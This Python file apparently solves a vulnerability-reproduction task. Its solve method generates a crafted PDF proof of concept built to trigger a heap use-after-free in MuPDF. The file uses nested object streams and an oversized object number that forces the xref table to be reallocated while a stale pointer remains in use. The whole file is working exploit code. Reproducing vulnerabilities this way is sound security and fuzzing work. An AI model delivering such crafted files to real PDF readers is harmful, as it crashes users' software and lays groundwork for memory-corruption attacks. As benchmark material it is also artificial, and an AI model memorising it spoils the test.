import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
        
        The strategy is to create a PDF with Object Streams where:
        1. Accessing the Root object (Obj 4) triggers loading of Object Stream 2.
        2. Object Stream 2 has an /Extends entry pointing to Object Stream 3.
        3. Recursively loading Object Stream 3 processes its header.
        4. Object Stream 3 claims to contain a very high object number (2000), 
           which forces the xref table to be reallocated (resized) to accommodate it.
        5. This reallocation happens while the caller (loading Object Stream 2) still 
           holds a pointer to an xref entry from the old table, causing a UAF when it returns.
        """
        
        def create_obj(oid, content):
            return f"{oid} 0 obj\n".encode() + content + b"\nendobj\n"

        def create_stream(dct, data):
            return dct + b"\nstream\n" + data + b"\nendstream"

        # Obj 4: Root Catalog, defined inside ObjStm 2
        # Needs to point to a valid Pages object (Obj 5)
        obj4_data = b"<</Type/Catalog/Pages 5 0 R>>"
        
        # Obj 2: Object Stream containing Obj 4.
        # It extends Obj 3, which triggers the recursive load.
        # Header "4 0" indicates Obj 4 is at offset 0 relative to First.
        # "4 0 " is 4 bytes long, so /First should be 4.
        obj2_stm_data = b"4 0 " + obj4_data
        obj2_dict = b"<</Type/ObjStm/N 1/First 4/Extends 3 0 R/Length " + str(len(obj2_stm_data)).encode() + b">>"
        obj2_body = create_stream(obj2_dict, obj2_stm_data)
        
        # Obj 3: The Trigger Object Stream.
        # It claims to contain Object 2000.
        # Parsing "2000 0" in the stream header will cause pdf_ensure_xref_size(2000),
        # reallocating the xref table.
        obj3_stm_data = b"2000 0 (trigger)"
        obj3_dict = b"<</Type/ObjStm/N 1/First 7/Length " + str(len(obj3_stm_data)).encode() + b">>"
        obj3_body = create_stream(obj3_dict, obj3_stm_data)
        
        # Obj 5: Minimal Pages object
        obj5_body = b"<</Type/Pages/Count 0/Kids[]>>"
        
        # PDF Header
        header = b"%PDF-1.7\n%\x80\x81\x82\x83\n"
        base = len(header)
        
        # Assemble Body Objects and calculate offsets
        # Obj 2
        chunk2 = create_obj(2, obj2_body)
        off2 = base
        
        # Obj 3
        chunk3 = create_obj(3, obj3_body)
        off3 = base + len(chunk2)
        
        # Obj 5
        chunk5 = create_obj(5, obj5_body)
        off5 = off3 + len(chunk3)
        
        # Obj 1: XRef Stream (replaces standard xref table)
        # Positioned after other objects
        off1 = off5 + len(chunk5)
        
        # Construct XRef Stream Rows
        # W [1 2 2] means 1 byte type, 2 bytes field2, 2 bytes field3.
        # Size must cover 0-5 initially (Size 6).
        # Obj 2000 is not in the initial map, but appears during parsing.
        
        def ent(t, f2, f3): 
            return bytes([t]) + f2.to_bytes(2, 'big') + f3.to_bytes(2, 'big')
        
        xref_rows = (
            ent(0, 0, 65535) + # 0: Free
            ent(1, off1, 0) +  # 1: Obj 1 (XRef Stream)
            ent(1, off2, 0) +  # 2: Obj 2 (ObjStm)
            ent(1, off3, 0) +  # 3: Obj 3 (ObjStm)
            ent(2, 2, 0) +     # 4: Obj 4 (Compressed in Stream 2, Index 0)
            ent(1, off5, 0)    # 5: Obj 5 (Pages)
        )
        
        obj1_dict = b"<</Type/XRef/Size 6/Root 4 0 R/W[1 2 2]/Index[0 6]/Length " + str(len(xref_rows)).encode() + b">>"
        obj1_body = create_stream(obj1_dict, xref_rows)
        chunk1 = create_obj(1, obj1_body)
        
        # Trailer / Footer
        footer = b"startxref\n" + str(off1).encode() + b"\n%%EOF"
        
        return header + chunk2 + chunk3 + chunk5 + chunk1 + footer